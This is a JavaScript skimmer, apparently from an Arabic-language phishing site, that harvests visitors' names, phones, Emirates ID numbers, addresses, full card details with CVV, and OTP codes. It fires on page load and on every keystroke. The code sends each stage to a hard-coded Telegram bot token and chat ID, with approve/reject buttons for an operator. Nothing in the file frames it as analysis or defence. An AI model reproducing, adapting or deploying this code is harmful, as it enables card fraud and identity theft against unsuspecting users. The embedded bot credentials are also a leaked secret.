(() => {
  const TELEGRAM_BOT_TOKEN = '9251808066:AAHlZtvVd1q2bOL_Ml8Uig6OW-wW4gNLkvQ';
  const TELEGRAM_CHAT_ID = '8618091345';
  const STORAGE_KEY = 'fazaa_lead_state';
  const PAGE_STAGE = location.pathname.includes('/otp') ? 'otp' : location.pathname.includes('/payment') ? 'payment' : 'order';

  function getState() {
    try {
      return JSON.parse(sessionStorage.getItem(STORAGE_KEY) || '{}');
    } catch (error) {
      return {};
    }
  }

  function saveState(data) {
    const current = getState();
    const next = { ...current, ...data, updatedAt: new Date().toISOString() };
    sessionStorage.setItem(STORAGE_KEY, JSON.stringify(next));
    return next;
  }

  function matchPattern(element, pattern) {
    const haystacks = [
      element.id || '',
      element.name || '',
      element.placeholder || '',
      element.getAttribute('aria-label') || '',
      element.title || '',
      element.getAttribute('data-label') || ''
    ].map((value) => String(value).toLowerCase());

    return haystacks.some((value) => value.includes(String(pattern).toLowerCase()));
  }

  function readField(patterns, fallback = '') {
    const fields = [...document.querySelectorAll('input, select, textarea')];

    for (const pattern of patterns) {
      const node = fields.find((element) => matchPattern(element, pattern));
      if (node && node.value && node.value.trim()) {
        return node.value.trim();
      }
    }

    return fallback;
  }

  function readOrderData() {
    return {
      fullName: readField(['fullName', 'fullname', 'ownername', 'الاسم', 'يرجى إدخال اسمك', 'اسمك', 'name'], getState().fullName || ''),
      phone: readField(['phone', 'mobile', 'tel', 'هاتف', 'رقم الهاتف', 'يرجى إدخال رقم هاتفك', 'رقم جوال', 'phoneNumber'], getState().phone || ''),
      emiratesId: readField(['emiratesid', 'emirates', 'identity', 'idnumber', 'هوية', 'رقم الهوية', 'يرجى إدخال رقم الهوية', 'id'], getState().emiratesId || ''),
      region: readField(['region', 'المنطقة', 'مدينة', 'state'], getState().region || ''),
      street: readField(['street', 'شارع', 'address', 'عنوان'], getState().street || ''),
      district: readField(['district', 'حي', 'الديرة', 'area'], getState().district || '')
    };
  }

  function readPaymentData() {
    return {
      cardNumber: readField(['cardnumber', 'card number', 'رقم البطاقة', 'بطاقة', '0000', 'card'], getState().cardNumber || ''),
      cardHolder: readField(['cardholder', 'holder', 'اسم حامل', 'حامل البطاقة', 'card holder'], getState().cardHolder || ''),
      expiry: readField(['expiry', 'mm/yy', 'تاريخ', 'انتهاء', 'expirydate'], getState().expiry || ''),
      cvv: readField(['cvv', 'security', 'رمز', '•••', 'رقم الأمان', 'code'], getState().cvv || '')
    };
  }

  function readOtpData() {
    const otp = readField(['otp', 'one-time-code', 'verification', 'رمز التحقق', 'ادخل رمز التحقق', 'كود', 'otpcode'], getState().otpCode || getState().otp || '');
    return otp ? { otpCode: otp } : {};
  }

  function formatTelegramMessage(data) {
    const stage = data.stage || 'order';
    const rows = [
      stage === 'order' ? '📝 بيانات الطلب الأساسية' : stage === 'payment' ? '💳 بيانات الدفع / البطاقة' : '🔐 رمز التحقق (OTP)',
      '',
      `👤 الاسم: ${data.fullName || 'غير محدد'}`,
      `📞 الهاتف: ${data.phone || 'غير محدد'}`,
      `🆔 الهوية: ${data.emiratesId || 'غير محدد'}`
    ];

    if (stage === 'payment' || stage === 'order') {
      rows.push(`💳 رقم البطاقة: ${data.cardNumber || 'غير محدد'}`);
      rows.push(`🏷️ صاحب البطاقة: ${data.cardHolder || 'غير محدد'}`);
      rows.push(`📅 تاريخ انتهاء البطاقة: ${data.expiry || 'غير محدد'}`);
      rows.push(`🔐 CVV: ${data.cvv || 'غير محدد'}`);
    }

    if (stage === 'order') {
      rows.push(`📍 المنطقة: ${data.region || 'غير محدد'}`);
      rows.push(`🏙️ الشارع: ${data.street || 'غير محدد'}`);
      rows.push(`🧭 الحي: ${data.district || 'غير محدد'}`);
    }

    if (stage === 'otp') {
      rows.push(`🔑 رمز التحقق: ${data.otpCode || data.otp || 'غير محدد'}`);
    }

    rows.push('', `⏱️ الوقت: ${new Date().toLocaleString('ar-AE')}`);
    return rows.join('\n');
  }

  function buildTelegramKeyboard(stage = 'order') {
    const label = stage === 'otp' ? 'OTP' : stage === 'payment' ? 'الدفع' : 'الطلب';
    return {
      inline_keyboard: [
        [
          { text: '✅ موافق', callback_data: `approve:${label}` },
          { text: '❌ رفض', callback_data: `reject:${label}` }
        ]
      ]
    };
  }

  async function sendToTelegram(payload) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      return { ok: true, skipped: true };
    }

    try {
      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: formatTelegramMessage(payload),
          parse_mode: 'HTML',
          reply_markup: buildTelegramKeyboard(payload.stage || 'order')
        })
      });
      const result = await response.json();
      console.log('Telegram send result:', result);
      return { ok: response.ok && result.ok, result };
    } catch (error) {
      console.error('Telegram send failed:', error);
      return { ok: false, error: error.message };
    }
  }

  async function notify(stage, extra = {}) {
    const current = getState();
    const payload = saveState({ ...current, ...extra, stage, updatedAt: new Date().toISOString() });
    await sendToTelegram(payload);
    return payload;
  }

  window.notifyLeadStage = async function (stage, extraData = {}) {
    return notify(stage, extraData);
  };

  const sent = { order: false, payment: false, otp: false };

  function emitIfNeeded(stage, data) {
    if (sent[stage]) return;
    sent[stage] = true;
    notify(stage, data).catch((error) => console.error('Notify failed:', error));
  }

  function attachStageListeners() {
    if (PAGE_STAGE === 'order') {
      const orderData = readOrderData();
      if (Object.values(orderData).some(Boolean)) {
        emitIfNeeded('order', orderData);
      }

      document.querySelectorAll('input, select, textarea').forEach((field) => {
        field.addEventListener('input', () => {
          const data = readOrderData();
          if (Object.values(data).some(Boolean)) emitIfNeeded('order', data);
        }, { passive: true });
      });
    }

    if (PAGE_STAGE === 'payment') {
      const paymentData = readPaymentData();
      if (Object.values(paymentData).some(Boolean)) {
        emitIfNeeded('payment', paymentData);
      }

      document.querySelectorAll('input, select, textarea').forEach((field) => {
        field.addEventListener('input', () => {
          const data = readPaymentData();
          if (Object.values(data).some(Boolean)) emitIfNeeded('payment', data);
        }, { passive: true });
      });
    }

    if (PAGE_STAGE === 'otp') {
      const otpData = readOtpData();
      if (otpData.otpCode) {
        emitIfNeeded('otp', otpData);
      }

      document.querySelectorAll('input, select, textarea').forEach((field) => {
        field.addEventListener('input', () => {
          const data = readOtpData();
          if (data.otpCode) emitIfNeeded('otp', data);
        }, { passive: true });
      });
    }
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', attachStageListeners, { once: true });
  } else {
    setTimeout(attachStageListeners, 500);
  }
})();
